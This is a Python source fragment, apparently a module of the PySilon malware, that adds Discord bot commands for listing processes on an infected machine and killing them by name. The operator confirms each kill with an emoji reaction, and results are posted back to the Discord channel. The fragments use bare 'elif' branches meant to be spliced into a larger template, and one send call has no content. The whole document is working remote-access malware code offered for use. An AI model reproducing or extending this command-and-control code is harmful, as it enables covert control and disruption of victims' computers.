from psutil import process_iter
from resources.misc import *
# end of imports

# on reaction add
elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you really want to kill process: ':
    await reaction.message.delete()
    try:
        process_name = process_to_kill[0]
        if process_name[-1] == ']':
            process_name = process_name[::-1]
            for i in range(len(process_name)):
                if process_name[i] == '[':
                    process_name = process_name[i+4:]
                    break
            process_name = process_name[::-1]
    except Exception as e:
        embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
        
        reaction_msg = await reaction.message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    try:
        killed_processes = []
        for proc in process_iter():
            if proc.name() == process_name:
                proc.kill()
                killed_processes.append(proc.name())
        processes_killed = ''
        for i in killed_processes:
            processes_killed = processes_killed + '\n• ' + str(i)
        embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
        
        reaction_msg = await reaction.message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    except Exception as e:
        embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
        
        reaction_msg = await reaction.message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
        
elif str(reaction) == '🔴' and reaction.message.content[-25:] == '.kill <process-number>```':
    for i in processes_messages:
        try: await i.delete()
        except: pass
    processes_messages = []

# on message
elif message.content[:5] == '.show':
    await message.delete()
    if message.content.strip() == '.show':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .show <what-to-show>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
        
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        if message.content[6:] == 'processes':
            processes, processes_list = [], []
            for proc in process_iter():
                processes.append(proc.name())
            processes.sort(key=str.lower)
            how_many, temp = 1, processes[0]; processes.pop(0)
            for i in processes:
                if temp == i: how_many += 1
                else:
                    if how_many == 1: processes_list.append('``' + temp + '``')
                    else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
                    temp = i
            total_processes = len(processes)
            processes = ''
            reaction_msg = await message.channel.send('```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
            processes_messages.append(reaction_msg)
            for proc in range(1, len(processes_list)):
                if len(processes) < 1800:
                    processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
                else:
                    processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
                    reaction_msg = await message.channel.send(processes)
                    processes_messages.append(reaction_msg)
                    processes = ''
            reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
            processes_messages.append(reaction_msg)
            await reaction_msg.add_reaction('🔴')

elif message.content[:5] == '.kill':
    await message.delete()
    if len(processes_list) > 10:
        try: asd = int(message.content[6:]) + 1
        except:
            embed = discord.Embed(title="📛 Error",description=f'```Please provide a valid number of process from  .show processes```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
            
            reaction_msg = await message.channel.send(embed=embed)
            await reaction_msg.add_reaction('🔴')
            return
        if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
            embed = discord.Embed(title="🟢 Success",description='```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
            
            reaction_msg = await message.channel.send(embed=embed)
            process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
            await reaction_msg.add_reaction('💀')
            await reaction_msg.add_reaction('🔴')
        else:
            embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
            
            reaction_msg = await message.channel.send(embed=embed)
            await reaction_msg.add_reaction('🔴')
    else:
        embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
        
        reaction_msg = await message.channel.send()
        await reaction_msg.add_reaction('🔴')
